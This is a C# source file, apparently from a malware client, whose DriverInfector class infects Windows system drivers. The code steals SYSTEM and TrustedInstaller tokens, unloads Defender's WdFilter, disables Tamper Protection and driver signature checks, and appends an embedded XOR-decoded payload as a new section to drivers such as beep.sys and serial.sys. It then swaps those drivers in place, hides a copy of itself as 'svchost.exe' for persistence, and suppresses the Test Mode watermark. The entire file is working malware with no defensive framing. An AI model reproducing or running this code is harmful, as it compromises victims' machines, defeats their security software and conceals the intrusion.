using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

public static class DriverInfector
{
	public struct LUID
	{
		public uint LowPart;

		public int HighPart;
	}

	public struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		public LUID_AND_ATTRIBUTES Privileges;
	}

	public struct LUID_AND_ATTRIBUTES
	{
		public LUID Luid;

		public uint Attributes;
	}

	public struct UNICODE_STRING
	{
		public ushort Length;

		public ushort MaximumLength;

		public IntPtr Buffer;
	}

	private struct SectionHeader
	{
		public string Name;

		public uint VirtualSize;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint Characteristics;
	}

	private static IntPtr hTiTokenStored = IntPtr.Zero;

	private const string PAYLOAD_SECTION = ".inf";

	private const uint IMAGE_SCN_CNT_CODE = 32u;

	private const uint IMAGE_SCN_MEM_EXECUTE = 536870912u;

	private const uint IMAGE_SCN_MEM_READ = 1073741824u;

	private const uint IMAGE_SCN_MEM_WRITE = 2147483648u;

	private const uint MOVEFILE_REPLACE_EXISTING = 1u;

	private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 4u;

	public static void Run()
	{
		string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "driver_infector.log");
		try
		{
			if (!IsAdmin())
			{
				RestartAsAdmin();
				return;
			}
			File.AppendAllText(logFile, $"\n[{DateTime.Now}] Starting mass infection (Admin mode)...\n");
			byte[] payload = GetPayload();
			if (payload == null)
			{
				File.AppendAllText(logFile, "Payload is NULL\n");
				return;
			}
			File.AppendAllText(logFile, $"Payload size: {payload.Length}\n");
			new Thread((ThreadStart)delegate
			{
				try
				{
					bool flag = ElevateToTrustedInstallerAndUnloadWdFilter(logFile);
					File.AppendAllText(logFile, $"Elevated to SYSTEM/TI: {flag}\n");
					DisableDefenderTamperProtectionTemporarily();
					EnableTestSigning(logFile);
					string[] targetDrivers = GetTargetDrivers();
					int num = 0;
					string[] array = targetDrivers;
					foreach (string text in array)
					{
						try
						{
							switch (Path.GetFileName(text).ToLower())
							{
							case "pci.sys":
							case "volmgr.sys":
							case "storahci.sys":
							case "volsnap.sys":
							case "classpnp.sys":
							case "ntfs.sys":
							case "vga.sys":
							case "vgapnp.sys":
							case "dxgkrnl.sys":
							case "monitor.sys":
							case "hidusb.sys":
							case "mouhid.sys":
							case "kbdhid.sys":
							case "ndis.sys":
							case "partmgr.sys":
							case "mountmgr.sys":
							case "disk.sys":
							case "cdrom.sys":
							case "fileinfo.sys":
							case "fvevol.sys":
							case "iorate.sys":
								File.AppendAllText(logFile, "CRITICAL DRIVER SKIPPED (protection): " + text + "\n");
								break;
							default:
								File.AppendAllText(logFile, "Attempting to infect: " + text + "\n");
								if (InfectAndReplace(text, payload, logFile))
								{
									num++;
									File.AppendAllText(logFile, "Infection success: " + text + "\n");
								}
								else
								{
									File.AppendAllText(logFile, "Infection failed: " + text + "\n");
								}
								break;
							}
						}
						catch (Exception ex2)
						{
							File.AppendAllText(logFile, "Error infecting " + text + ": " + ex2.Message + "\n");
						}
					}
					if (flag)
					{
						RevertToSelf();
						if (hTiTokenStored != IntPtr.Zero)
						{
							CloseHandle(hTiTokenStored);
							hTiTokenStored = IntPtr.Zero;
						}
					}
					File.AppendAllText(logFile, $"Mass infection finished. Successful: {num}/{targetDrivers.Length}\n");
					if (num >= 10)
					{
						File.AppendAllText(logFile, "Infection successful. Hiding signs...\n");
						if (flag)
						{
							RevertToSelf();
						}
						HideTestModeWatermark(logFile);
					}
				}
				catch (Exception ex3)
				{
					File.AppendAllText(logFile, "Async infection error: " + ex3.Message + "\n");
				}
			}).Start();
		}
		catch (Exception ex)
		{
			File.AppendAllText(logFile, "Critical error in Run: " + ex.Message + "\n");
		}
	}

	private static string[] GetTargetDrivers()
	{
		string path = Path.Combine(Environment.SystemDirectory, "drivers");
		string[] obj = new string[10] { "null.sys", "beep.sys", "rasl2tp.sys", "raspppoe.sys", "raspptp.sys", "modem.sys", "parport.sys", "serenum.sys", "serial.sys", "usbprint.sys" };
		List<string> list = new List<string>();
		string[] array = obj;
		foreach (string path2 in array)
		{
			string text = Path.Combine(path, path2);
			if (File.Exists(text))
			{
				list.Add(text);
			}
		}
		return list.ToArray();
	}

	private static byte[] GetPayload()
	{
		try
		{
			Assembly assembly = typeof(DriverInfector).Assembly;
			string text = assembly.GetManifestResourceNames().FirstOrDefault((string n) => n.EndsWith("driver.sys", StringComparison.OrdinalIgnoreCase));
			if (string.IsNullOrEmpty(text))
			{
				return null;
			}
			using Stream stream = assembly.GetManifestResourceStream(text);
			if (stream == null)
			{
				return null;
			}
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			if (!string.IsNullOrEmpty(Config.Key))
			{
				return Xor.DecodEncod(array, Encoding.ASCII.GetBytes(Config.Key));
			}
			return array;
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static bool InfectAndReplace(string targetPath, byte[] payloadData, string logFile)
	{
		try
		{
			byte[] array = File.ReadAllBytes(targetPath);
			File.AppendAllText(logFile, $"Read target driver: {array.Length} bytes\n");
			byte[] array2 = null;
			using (MemoryStream memoryStream = new MemoryStream(array))
			{
				using BinaryReader binaryReader = new BinaryReader(memoryStream);
				using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				if (binaryReader.ReadUInt16() != 23117)
				{
					File.AppendAllText(logFile, "NOT MZ SIGNATURE\n");
					return false;
				}
				memoryStream.Seek(60L, SeekOrigin.Begin);
				int num = binaryReader.ReadInt32();
				memoryStream.Seek(num, SeekOrigin.Begin);
				if (binaryReader.ReadUInt32() != 17744)
				{
					File.AppendAllText(logFile, "NOT PE SIGNATURE\n");
					return false;
				}
				short num2 = binaryReader.ReadInt16();
				short num3 = binaryReader.ReadInt16();
				memoryStream.Seek(12L, SeekOrigin.Current);
				short num4 = binaryReader.ReadInt16();
				binaryReader.ReadInt16();
				File.AppendAllText(logFile, $"Machine: {num2:X}, Sections: {num3}, OptHeaderSize: {num4}\n");
				int num5 = (int)memoryStream.Position;
				short num6 = binaryReader.ReadInt16();
				if (num6 != 523)
				{
					File.AppendAllText(logFile, $"INVALID MAGIC: {num6:X} (expected 20B)\n");
					return false;
				}
				memoryStream.Seek(num5 + 16, SeekOrigin.Begin);
				uint value = binaryReader.ReadUInt32();
				memoryStream.Seek(num5 + 32, SeekOrigin.Begin);
				uint alignment = binaryReader.ReadUInt32();
				uint alignment2 = binaryReader.ReadUInt32();
				memoryStream.Seek(num5 + 56, SeekOrigin.Begin);
				binaryReader.ReadUInt32();
				uint num7 = binaryReader.ReadUInt32();
				memoryStream.Seek(num5 + 104, SeekOrigin.Begin);
				int num8 = (int)memoryStream.Position;
				binaryReader.ReadUInt32();
				memoryStream.Seek(num5 + 92, SeekOrigin.Begin);
				uint num9 = binaryReader.ReadUInt32();
				if (num9 < 16)
				{
					File.AppendAllText(logFile, $"WARNING: numberOfRvaAndSizes is {num9}, expected >= 16. LoaderFlags offset might be incorrect.\n");
				}
				int num10 = num + 4 + 20 + num4;
				if (num10 + (num3 + 1) * 40 > num7)
				{
					File.AppendAllText(logFile, $"NOT ENOUGH HEADER SPACE: {num10 + (num3 + 1) * 40} > {num7}\n");
					return false;
				}
				memoryStream.Seek(num10, SeekOrigin.Begin);
				List<SectionHeader> list = new List<SectionHeader>();
				for (int i = 0; i < num3; i++)
				{
					SectionHeader item = new SectionHeader
					{
						Name = Encoding.ASCII.GetString(binaryReader.ReadBytes(8)).TrimEnd(new char[1]),
						VirtualSize = binaryReader.ReadUInt32(),
						VirtualAddress = binaryReader.ReadUInt32(),
						SizeOfRawData = binaryReader.ReadUInt32(),
						PointerToRawData = binaryReader.ReadUInt32()
					};
					memoryStream.Seek(12L, SeekOrigin.Current);
					item.Characteristics = binaryReader.ReadUInt32();
					list.Add(item);
				}
				if (list.Count == 0)
				{
					File.AppendAllText(logFile, "NO SECTIONS FOUND\n");
					return false;
				}
				File.AppendAllText(logFile, "Successfully parsed headers and sections. Proceeding to infect...\n");
				memoryStream.Seek(num8, SeekOrigin.Begin);
				binaryWriter.Write(value);
				SectionHeader sectionHeader = list[list.Count - 1];
				uint num11 = Align(sectionHeader.VirtualAddress + Align(sectionHeader.VirtualSize, alignment), alignment);
				uint val = sectionHeader.PointerToRawData + sectionHeader.SizeOfRawData;
				uint val2 = (uint)array.Length;
				uint num12 = Align(Math.Max(val, val2), alignment2);
				uint num13 = (uint)payloadData.Length;
				uint num14 = Align(num13, alignment2);
				SectionHeader sectionHeader2 = new SectionHeader
				{
					Name = ".inf",
					VirtualSize = num13,
					VirtualAddress = num11,
					SizeOfRawData = num14,
					PointerToRawData = num12,
					Characteristics = 3758096416u
				};
				SectionHeader sectionHeader3 = new SectionHeader
				{
					Name = ".cfg"
				};
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "WindowsControl");
				string text2 = Path.Combine(text, "svchost.exe");
				try
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
				}
				catch (Exception ex)
				{
					File.AppendAllText(logFile, "Failed to create directory: " + ex.Message + "\n");
				}
				if (File.Exists(text2))
				{
					File.SetAttributes(text2, FileAttributes.Normal);
				}
				try
				{
					string fileName = Process.GetCurrentProcess().MainModule.FileName;
					if (fileName.ToLower() != text2.ToLower())
					{
						File.Copy(fileName, text2, overwrite: true);
						File.AppendAllText(logFile, "Copied client to: " + text2 + "\n");
					}
				}
				catch (Exception ex2)
				{
					File.AppendAllText(logFile, "Failed to copy client to ProgramData: " + ex2.Message + "\n");
					text2 = Process.GetCurrentProcess().MainModule.FileName;
				}
				try
				{
					if (File.Exists(text2))
					{
						File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
					}
				}
				catch
				{
				}
				byte[] bytes = Encoding.Unicode.GetBytes(text2 + "\0");
				uint num15 = (uint)bytes.Length;
				uint num16 = Align(num15, alignment2);
				uint num17 = Align(num11 + num14, alignment);
				uint num18 = Align(num12 + num14, alignment2);
				sectionHeader3.VirtualSize = num15;
				sectionHeader3.VirtualAddress = num17;
				sectionHeader3.SizeOfRawData = num16;
				sectionHeader3.PointerToRawData = num18;
				sectionHeader3.Characteristics = 1073741888u;
				memoryStream.Seek(num10 + num3 * 40, SeekOrigin.Begin);
				byte[] array3 = new byte[8];
				Encoding.ASCII.GetBytes(sectionHeader2.Name).CopyTo(array3, 0);
				binaryWriter.Write(array3);
				binaryWriter.Write(sectionHeader2.VirtualSize);
				binaryWriter.Write(sectionHeader2.VirtualAddress);
				binaryWriter.Write(sectionHeader2.SizeOfRawData);
				binaryWriter.Write(sectionHeader2.PointerToRawData);
				binaryWriter.Write(0);
				binaryWriter.Write(0);
				binaryWriter.Write((short)0);
				binaryWriter.Write((short)0);
				binaryWriter.Write(sectionHeader2.Characteristics);
				byte[] array4 = new byte[8];
				Encoding.ASCII.GetBytes(sectionHeader3.Name).CopyTo(array4, 0);
				binaryWriter.Write(array4);
				binaryWriter.Write(sectionHeader3.VirtualSize);
				binaryWriter.Write(sectionHeader3.VirtualAddress);
				binaryWriter.Write(sectionHeader3.SizeOfRawData);
				binaryWriter.Write(sectionHeader3.PointerToRawData);
				binaryWriter.Write(0);
				binaryWriter.Write(0);
				binaryWriter.Write((short)0);
				binaryWriter.Write((short)0);
				binaryWriter.Write(sectionHeader3.Characteristics);
				memoryStream.Seek(num + 4 + 2, SeekOrigin.Begin);
				binaryWriter.Write((short)(num3 + 2));
				memoryStream.Seek(num5 + 56, SeekOrigin.Begin);
				binaryWriter.Write(Align(num17 + num15, alignment));
				memoryStream.Seek(num5 + 16, SeekOrigin.Begin);
				binaryWriter.Write(num11);
				memoryStream.Seek(num5 + 64, SeekOrigin.Begin);
				binaryWriter.Write(0u);
				uint num19 = num18 + num16;
				File.AppendAllText(logFile, $"Total new size: {num19}, Payload offset: {num12}, Config offset: {num18}\n");
				array2 = new byte[num19];
				Buffer.BlockCopy(array, 0, array2, 0, array.Length);
				Buffer.BlockCopy(payloadData, 0, array2, (int)num12, payloadData.Length);
				Buffer.BlockCopy(bytes, 0, array2, (int)num18, bytes.Length);
				UpdateCheckSum(array2, num, num5);
			}
			if (array2 != null)
			{
				File.AppendAllText(logFile, "Constructed infected bytes. Size: " + array2.Length + "\n");
				string text3 = targetPath + ".bak";
				if (File.Exists(text3))
				{
					try
					{
						File.AppendAllText(logFile, "Detected existing backup " + text3 + ". Cleaning up and restoring original driver...\n");
						try
						{
							ExecuteCommand("icacls \"" + targetPath + "\" /grant administrators:F");
						}
						catch
						{
						}
						try
						{
							ExecuteCommand("icacls \"" + text3 + "\" /grant administrators:F");
						}
						catch
						{
						}
						File.SetAttributes(targetPath, FileAttributes.Normal);
						File.SetAttributes(text3, FileAttributes.Normal);
						if (File.Exists(targetPath))
						{
							try
							{
								File.Delete(targetPath);
							}
							catch
							{
								File.AppendAllText(logFile, "Direct delete failed, trying move to temp...\n");
								string lpNewFileName = targetPath + ".old";
								MoveFileEx(targetPath, lpNewFileName, 1u);
							}
						}
						if (MoveFileEx(text3, targetPath, 1u))
						{
							File.AppendAllText(logFile, "Original driver restored successfully.\n");
						}
						else
						{
							File.AppendAllText(logFile, "Failed to restore via MoveFileEx. Attempting CMD force move...\n");
							ExecuteCommand("move /y \"" + text3 + "\" \"" + targetPath + "\"");
						}
						if (File.Exists(targetPath))
						{
							array = File.ReadAllBytes(targetPath);
							File.AppendAllText(logFile, $"Re-read original driver: {array.Length} bytes\n");
						}
					}
					catch (Exception ex3)
					{
						File.AppendAllText(logFile, "Re-infection cleanup error: " + ex3.Message + "\n");
					}
				}
				try
				{
					File.AppendAllText(logFile, "Attempting to replace " + targetPath + " with TI privileges...\n");
					try
					{
						File.SetAttributes(targetPath, FileAttributes.Normal);
					}
					catch
					{
					}
					try
					{
						ExecuteCommand("icacls \"" + targetPath + "\" /grant administrators:F /t /c");
					}
					catch
					{
					}
					if (!MoveFileEx(targetPath, text3, 1u))
					{
						int lastWin32Error = Marshal.GetLastWin32Error();
						File.AppendAllText(logFile, $"MoveFileEx failed with error: {lastWin32Error}. Trying delay until reboot...\n");
						if (MoveFileEx(targetPath, text3, 5u))
						{
							File.AppendAllText(logFile, "Scheduled replacement for next reboot.\n");
							string text4 = targetPath + ".new";
							try
							{
								File.WriteAllBytes(text4, array2);
							}
							catch
							{
							}
							if (File.Exists(text4) && MoveFileEx(text4, targetPath, 5u))
							{
								File.AppendAllText(logFile, "Infected driver queued for replacement.\n");
								return true;
							}
						}
						File.Move(targetPath, text3);
					}
					if (File.Exists(targetPath))
					{
						File.AppendAllText(logFile, "Move failed, driver might be in use.\n");
						return false;
					}
					File.AppendAllText(logFile, "Move successful. Writing infected bytes...\n");
					File.WriteAllBytes(targetPath, array2);
					File.AppendAllText(logFile, "WriteAllBytes successful!\n");
					return true;
				}
				catch (Exception ex4)
				{
					File.AppendAllText(logFile, "TI MOVE/WRITE ERROR: " + ex4.Message + ". Falling back to CMD...\n");
					ExecuteCommand("takeown /f \"" + targetPath + "\" /a");
					ExecuteCommand("icacls \"" + targetPath + "\" /grant administrators:F");
					ExecuteCommand("move /y \"" + targetPath + "\" \"" + text3 + "\"");
					if (!File.Exists(targetPath))
					{
						File.WriteAllBytes(targetPath, array2);
						File.AppendAllText(logFile, "Fallback WriteAllBytes successful!\n");
						return true;
					}
					File.AppendAllText(logFile, "All replacement methods failed.\n");
				}
			}
		}
		catch (Exception ex5)
		{
			File.AppendAllText(logFile, "FATAL InfectAndReplace ERROR: " + ex5.Message + "\n" + ex5.StackTrace + "\n");
		}
		return false;
	}

	private static void UpdateCheckSum(byte[] fileBytes, int ntHeaderOffset, int optionalHeaderOffset)
	{
		long num = 0L;
		long num2 = 4294967295L;
		int num3 = optionalHeaderOffset + 64;
		fileBytes[num3] = 0;
		fileBytes[num3 + 1] = 0;
		fileBytes[num3 + 2] = 0;
		fileBytes[num3 + 3] = 0;
		for (int i = 0; i < fileBytes.Length; i += 2)
		{
			if (i + 1 < fileBytes.Length)
			{
				ushort num4 = (ushort)(fileBytes[i] | (fileBytes[i + 1] << 8));
				num += num4;
				if (num > num2)
				{
					num = (num & 0xFFFFFFFFu) + (num >> 32);
				}
			}
			else
			{
				num += fileBytes[i];
				if (num > num2)
				{
					num = (num & 0xFFFFFFFFu) + (num >> 32);
				}
			}
		}
		num = (num & 0xFFFF) + (num >> 16);
		num += num >> 16;
		num &= 0xFFFF;
		num += (uint)fileBytes.Length;
		Buffer.BlockCopy(BitConverter.GetBytes((uint)num), 0, fileBytes, num3, 4);
	}

	private static uint Align(uint size, uint alignment)
	{
		if (alignment == 0)
		{
			return size;
		}
		return (size + alignment - 1) / alignment * alignment;
	}

	private static void ExecuteCommand(string command)
	{
		try
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden
			})?.WaitForExit();
		}
		catch
		{
		}
	}

	private static bool IsAdmin()
	{
		try
		{
			using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
			return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch
		{
			return false;
		}
	}

	private static void RestartAsAdmin()
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = Process.GetCurrentProcess().MainModule.FileName,
				UseShellExecute = true,
				Verb = "runas"
			});
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private static bool ElevateToTrustedInstallerAndUnloadWdFilter(string logFile)
	{
		try
		{
			if (OpenProcessToken(Process.GetCurrentProcess().Handle, 40u, out var TokenHandle))
			{
				string[] array = new string[3] { "SeDebugPrivilege", "SeTakeOwnershipPrivilege", "SeRestorePrivilege" };
				foreach (string lpName in array)
				{
					TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
					if (LookupPrivilegeValue(null, lpName, out NewState.Privileges.Luid))
					{
						NewState.PrivilegeCount = 1u;
						NewState.Privileges.Attributes = 2u;
						AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges: false, ref NewState, 0u, IntPtr.Zero, IntPtr.Zero);
					}
				}
				CloseHandle(TokenHandle);
			}
			Process process = Process.GetProcessesByName("winlogon").FirstOrDefault();
			if (process != null)
			{
				IntPtr intPtr = OpenProcess(2035711u, bInheritHandle: false, process.Id);
				if (intPtr != IntPtr.Zero)
				{
					if (OpenProcessToken(intPtr, 6u, out var TokenHandle2))
					{
						if (DuplicateTokenEx(TokenHandle2, 983551u, IntPtr.Zero, 2, 1, out var phNewToken))
						{
							if (ImpersonateLoggedOnUser(phNewToken))
							{
								File.AppendAllText(logFile, "Impersonating winlogon (SYSTEM).\n");
							}
							CloseHandle(phNewToken);
						}
						CloseHandle(TokenHandle2);
					}
					CloseHandle(intPtr);
				}
			}
			Process process2 = Process.GetProcessesByName("TrustedInstaller").FirstOrDefault();
			if (process2 == null)
			{
				File.AppendAllText(logFile, "Starting TrustedInstaller service...\n");
				ExecuteCommand("sc start TrustedInstaller");
				Thread.Sleep(2000);
				process2 = Process.GetProcessesByName("TrustedInstaller").FirstOrDefault();
			}
			if (process2 != null)
			{
				IntPtr intPtr2 = OpenProcess(2035711u, bInheritHandle: false, process2.Id);
				if (intPtr2 != IntPtr.Zero)
				{
					if (OpenProcessToken(intPtr2, 6u, out var TokenHandle3))
					{
						if (DuplicateTokenEx(TokenHandle3, 983551u, IntPtr.Zero, 2, 1, out var phNewToken2))
						{
							string[] array = new string[5] { "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeBackupPrivilege", "SeTakeOwnershipPrivilege", "SeSystemEnvironmentPrivilege" };
							foreach (string text in array)
							{
								TOKEN_PRIVILEGES NewState2 = default(TOKEN_PRIVILEGES);
								if (LookupPrivilegeValue(null, text, out NewState2.Privileges.Luid))
								{
									NewState2.PrivilegeCount = 1u;
									NewState2.Privileges.Attributes = 2u;
									if (!AdjustTokenPrivileges(phNewToken2, DisableAllPrivileges: false, ref NewState2, 0u, IntPtr.Zero, IntPtr.Zero))
									{
										File.AppendAllText(logFile, $"Failed to enable {text}: {Marshal.GetLastWin32Error()}\n");
									}
								}
							}
							if (ImpersonateLoggedOnUser(phNewToken2))
							{
								File.AppendAllText(logFile, "Impersonating TrustedInstaller.\n");
								UNICODE_STRING DestinationString = default(UNICODE_STRING);
								RtlInitUnicodeString(ref DestinationString, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\WdFilter");
								int num = NtUnloadDriver(ref DestinationString);
								File.AppendAllText(logFile, $"NtUnloadDriver(WdFilter) status: 0x{num:X8}\n");
								hTiTokenStored = phNewToken2;
								CloseHandle(TokenHandle3);
								CloseHandle(intPtr2);
								return true;
							}
							CloseHandle(phNewToken2);
						}
						CloseHandle(TokenHandle3);
					}
					CloseHandle(intPtr2);
				}
			}
			File.AppendAllText(logFile, "Failed to fully impersonate TI.\n");
			return false;
		}
		catch (Exception ex)
		{
			File.AppendAllText(logFile, "Elevation ERROR: " + ex.Message + "\n");
			return false;
		}
	}

	private static void EnableTestSigning(string logFile)
	{
		try
		{
			File.AppendAllText(logFile, "Enabling TestSigning via BCD and Registry...\n");
			ExecuteCommand("bcdedit /set testsigning on");
			ExecuteCommand("bcdedit /set nointegritychecks on");
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control", writable: true);
			registryKey.SetValue("SystemStartOptions", " NOINTEGRITYCHECKS TESTSIGNING", RegistryValueKind.String);
		}
		catch (Exception ex)
		{
			File.AppendAllText(logFile, "Failed to enable testsigning: " + ex.Message + "\n");
		}
	}

	private static void HideTestModeWatermark(string logFile)
	{
		try
		{
			File.AppendAllText(logFile, "Attempting to hide Test Mode watermark...\n");
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
				registryKey?.SetValue("DisplayTestMode", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				using RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey2?.SetValue("HideTestMode", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			ExecuteCommand("bcdedit /set {current} testsigning off");
			ExecuteCommand("bcdedit /set testsigning on");
			try
			{
				using RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
				registryKey3?.SetValue("PaintDesktopVersion", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}
			UpdatePerUserSystemParameters(IntPtr.Zero, IntPtr.Zero, "1", 0);
			File.AppendAllText(logFile, "Watermark hide commands sent. Explorer restart skipped.\n");
		}
		catch (Exception ex)
		{
			File.AppendAllText(logFile, "Error hiding watermark: " + ex.Message + "\n");
		}
	}

	private static bool DisableDefenderTamperProtectionTemporarily()
	{
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", writable: true))
			{
				registryKey?.SetValue("TamperProtection", 0, RegistryValueKind.DWord);
			}
			ExecuteCommand("net stop WinDefend");
			ExecuteCommand("net start WinDefend");
			Thread.Sleep(1500);
			return true;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, uint dwFlags);

	[DllImport("user32.dll")]
	private static extern void UpdatePerUserSystemParameters(IntPtr hWnd, IntPtr hInst, string lpszCmdLine, int nCmdShow);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool RevertToSelf();

	[DllImport("ntdll.dll")]
	private static extern int NtUnloadDriver(ref UNICODE_STRING DriverName);

	[DllImport("ntdll.dll")]
	private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
}
